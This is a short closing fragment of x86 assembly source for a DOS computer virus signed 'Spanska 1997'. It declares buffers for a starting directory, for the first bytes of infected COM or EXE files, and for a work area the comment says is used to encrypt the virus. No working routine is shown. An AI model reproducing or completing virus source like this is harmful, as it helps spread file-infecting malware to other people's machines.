repert       db 64 dup (0FFh)     ;starting directory
exehead      db 1Ch dup(0aah)     ;1Ch first bytes of files (com or exe)
zone_de_travail:                  ;zone used to crypt the virus

code    ends
	end     hote

;------------------------(c) Spanska 1997------------------------------